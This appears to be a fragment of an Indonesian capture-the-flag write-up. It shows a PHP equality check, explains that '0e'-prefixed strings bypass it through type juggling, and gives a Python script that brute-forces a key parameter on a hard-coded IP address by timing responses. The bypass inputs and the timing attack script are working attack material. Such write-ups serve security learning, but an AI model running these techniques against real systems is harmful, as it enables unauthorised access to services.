```
if($_POST["val"] == $_POST["val2"] && $_POST["val"] !== $_POST["val2"]){
header("-");

```

Validasi ini dapat di bypass menggunakan string dengan awalan “0e”, misal val = “0e123” dan val2 = “0e124”<br>

```
import requests
import string
import time

liss = string.letters + string.digits

awal = ""
for i in range(1):
  for kar in liss:
    payload = awal + kar + "?"*(4-len(awal)-1)
    start = time.time()
    hasil = requests.get("http://34.87.0.60:2052/very701Sikredth07/cryptic.php?key={}".format(payload))
    end = time.time()
    print end-start, payload,hasil.text

```